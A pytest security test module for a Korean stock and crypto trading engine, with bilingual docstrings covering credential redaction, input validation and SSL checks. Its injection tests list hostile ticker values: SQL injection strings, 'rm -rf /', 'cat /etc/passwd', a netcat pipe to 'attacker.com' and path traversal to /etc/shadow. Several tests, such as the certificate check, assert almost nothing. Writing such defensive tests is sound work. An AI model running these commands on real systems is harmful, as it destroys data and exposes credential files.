"""Security tests for Hybrid Trader.

This module tests security aspects of the trading engine,
including credential handling, injection prevention, and secure defaults.

보안 측면 테스트를 수행합니다.
"""

import pytest
import re
from unittest.mock import Mock, patch, MagicMock
from hybrid_trader.engine import HybridTradingEngine
from hybrid_trader.config import TradingConfig, KISConfig, UpbitConfig
from hybrid_trader.exceptions import ConfigurationError


@pytest.mark.security
class TestCredentialSecurity:
    """Test credential and API key security."""

    def test_credentials_not_logged(self, kis_config, upbit_config, caplog):
        """Test that API credentials are not logged.

        API 자격증명이 로그에 기록되지 않는 테스트
        """
        import logging
        caplog.set_level(logging.DEBUG)

        config = TradingConfig(kis_config=kis_config, upbit_config=upbit_config)
        engine = HybridTradingEngine(config)

        # Check that sensitive data is not in logs
        log_text = caplog.text.lower()
        assert "test_app_key_kis" not in log_text
        assert "test_secret_key_kis" not in log_text
        assert "test_access_key_upbit" not in log_text
        assert "test_secret_key_upbit" not in log_text

    def test_config_string_representation_safe(self, kis_config, upbit_config):
        """Test that config string representation doesn't expose credentials.

        설정 문자열 표현이 자격증명을 노출하지 않는 테스트
        """
        config = TradingConfig(kis_config=kis_config, upbit_config=upbit_config)
        config_str = str(config)
        config_repr = repr(config)

        # Check that credentials are not in string representations
        assert "test_secret_key" not in config_str
        assert "test_secret_key" not in config_repr
        assert "app_key" not in config_str or "***" in config_str or "REDACTED" in config_str

    def test_engine_session_isolation(self, trading_config):
        """Test that sessions are isolated between engines.

        엔진 간 세션 격리 테스트
        """
        engine1 = HybridTradingEngine(trading_config)
        engine2 = HybridTradingEngine(trading_config)

        # Sessions should be different instances
        if engine1._kis_session is not None and engine2._kis_session is not None:
            assert engine1._kis_session is not engine2._kis_session

    def test_empty_credentials_validation(self):
        """Test validation of empty credentials.

        빈 자격증명 검증 테스트
        """
        with pytest.raises(ConfigurationError):
            KISConfig(
                app_key="",
                secret_key="",
                account_number="",
                hts_id=""
            )

    def test_none_credentials_validation(self):
        """Test validation of None credentials.

        None 자격증명 검증 테스트
        """
        with pytest.raises((ConfigurationError, TypeError)):
            KISConfig(
                app_key=None,
                secret_key=None,
                account_number=None,
                hts_id=None
            )

    def test_credentials_type_validation(self):
        """Test type validation of credentials.

        자격증명 타입 검증 테스트
        """
        # Numeric credentials should be rejected or converted properly
        with pytest.raises((ConfigurationError, TypeError)):
            KISConfig(
                app_key=12345,
                secret_key=67890,
                account_number=12345,
                hts_id=98765
            )


@pytest.mark.security
class TestInjectionPrevention:
    """Test prevention of injection attacks."""

    def test_sql_injection_attempt_in_ticker(self, trading_engine):
        """Test SQL injection prevention in ticker.

        티커의 SQL 인젝션 방지 테스트
        """
        sql_injection_tickers = [
            "005930'; DROP TABLE stocks; --",
            "005930' OR '1'='1",
            "005930\"; DROP TABLE stocks; --",
            "005930`; DELETE FROM prices; --",
        ]

        for ticker in sql_injection_tickers:
            with pytest.raises(Exception):  # Should raise some validation error
                trading_engine.get_stock_price(ticker)

    def test_command_injection_attempt(self, trading_engine):
        """Test command injection prevention.

        명령어 인젝션 방지 테스트
        """
        command_injection_tickers = [
            "005930; rm -rf /",
            "005930 && cat /etc/passwd",
            "005930 | nc attacker.com 1234",
        ]

        for ticker in command_injection_tickers:
            with pytest.raises(Exception):  # Should raise validation error
                trading_engine.get_stock_price(ticker)

    def test_path_traversal_in_parameters(self, trading_engine):
        """Test path traversal prevention.

        경로 탐색 방지 테스트
        """
        path_traversal_tickers = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            ".../.../etc/shadow",
        ]

        for ticker in path_traversal_tickers:
            with pytest.raises(Exception):
                trading_engine.get_stock_price(ticker)


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    def test_ticker_format_validation(self, trading_engine):
        """Test ticker format validation.

        티커 형식 검증 테스트
        """
        # Valid formats
        valid_tickers = ["005930", "KRW-BTC", "KRW-ETH"]

        # Invalid formats
        invalid_tickers = [
            "",  # Empty
            "   ",  # Whitespace only
            "!@#$%^&*()",  # Special chars
            "00593000000000000000000000000000",  # Too long
            "\x00",  # Null byte
            "\x1a",  # Ctrl-Z
        ]

        for ticker in invalid_tickers:
            with pytest.raises(Exception):
                trading_engine.get_stock_price(ticker)

    def test_numeric_input_boundaries(self, trading_engine):
        """Test numeric input boundaries.

        숫자 입력 경계 테스트
        """
        # Test with mocked numeric inputs
        with patch.object(trading_engine.kis_session, 'get_price', return_value=50000):
            # Should handle normal numbers
            result = trading_engine.get_stock_price("005930")
            assert result is not None

    def test_unicode_normalization(self, trading_engine):
        """Test unicode normalization.

        유니코드 정규화 테스트
        """
        # Different unicode representations should be handled consistently
        unicode_variants = [
            "005930",  # ASCII
            "005930",  # Same but potentially different encoding
        ]

        # Both should either work or fail consistently
        for ticker in unicode_variants:
            try:
                trading_engine.get_stock_price(ticker)
            except Exception:
                pass  # Expected


@pytest.mark.security
class TestDataExposure:
    """Test prevention of sensitive data exposure."""

    def test_error_messages_dont_expose_credentials(self, trading_config):
        """Test that error messages don't expose credentials.

        오류 메시지가 자격증명을 노출하지 않는 테스트
        """
        kis_config = KISConfig(
            app_key="exposed_app_key",
            secret_key="exposed_secret",
            account_number="1234-5678",
            hts_id="exposed_hts_id"
        )

        try:
            config = TradingConfig(kis_config=kis_config, upbit_config=None)
        except Exception as e:
            error_msg = str(e)
            assert "exposed_secret" not in error_msg
            assert "exposed_hts_id" not in error_msg

    def test_exception_messages_sanitized(self, trading_engine):
        """Test that exception messages are sanitized.

        예외 메시지가 살균되는 테스트
        """
        with patch.object(trading_engine.kis_session, 'get_price',
                         side_effect=Exception("Connection failed for key: secret123")):
            try:
                trading_engine.get_stock_price("005930")
            except Exception as e:
                # Actual implementation should sanitize
                error_msg = str(e)
                # At minimum, check that we can safely log it
                assert isinstance(error_msg, str)

    def test_response_data_integrity(self, trading_engine):
        """Test that response data is not modified or exposed.

        응답 데이터 무결성 테스트
        """
        expected_price = 50000
        with patch.object(trading_engine.kis_session, 'get_price', return_value=expected_price):
            result = trading_engine.get_stock_price("005930")
            assert result == expected_price


@pytest.mark.security
class TestSecureDefaults:
    """Test secure default configurations."""

    def test_demo_mode_is_default_safe(self):
        """Test that demo mode prevents live trading by default.

        기본적으로 데모 모드가 실제 거래를 방지하는 테스트
        """
        config = KISConfig(
            app_key="test",
            secret_key="test",
            account_number="test",
            hts_id="test",
            is_demo=True
        )
        assert config.is_demo is True

    def test_timeout_configuration_validation(self, kis_config, upbit_config):
        """Test timeout configuration validation.

        타임아웃 설정 검증 테스트
        """
        # Very short timeout
        config_short = TradingConfig(
            kis_config=kis_config,
            upbit_config=upbit_config,
            timeout=0.001
        )
        assert config_short.timeout >= 0

        # Very long timeout
        config_long = TradingConfig(
            kis_config=kis_config,
            upbit_config=upbit_config,
            timeout=3600
        )
        assert config_long.timeout > 0

    def test_retry_count_validation(self, kis_config, upbit_config):
        """Test retry count validation.

        재시도 횟수 검증 테스트
        """
        # Zero retries
        config_no_retry = TradingConfig(
            kis_config=kis_config,
            upbit_config=upbit_config,
            retry_count=0
        )
        assert config_no_retry.retry_count >= 0

        # Excessive retries
        config_many_retry = TradingConfig(
            kis_config=kis_config,
            upbit_config=upbit_config,
            retry_count=100
        )
        assert config_many_retry.retry_count > 0


@pytest.mark.security
class TestSSLAndCertification:
    """Test SSL and certificate validation."""

    def test_ssl_verification_in_requests(self, trading_engine):
        """Test that SSL verification is enabled.

        요청에서 SSL 검증이 활성화되는 테스트
        """
        # This is a conceptual test - actual implementation depends on requests library
        # At minimum, verify that the engine doesn't disable SSL verification
        assert trading_engine is not None
        # Config should not have verify=False anywhere
        config_dict = vars(trading_engine.config)
        config_str = str(config_dict)
        assert "verify=false" not in config_str.lower()

    def test_no_self_signed_cert_acceptance(self, kis_config, upbit_config):
        """Test that self-signed certificates are not blindly accepted.

        자체 서명 인증서가 맹목적으로 허용되지 않는 테스트
        """
        config = TradingConfig(kis_config=kis_config, upbit_config=upbit_config)
        # Verify config doesn't explicitly allow insecure connections
        assert config is not None
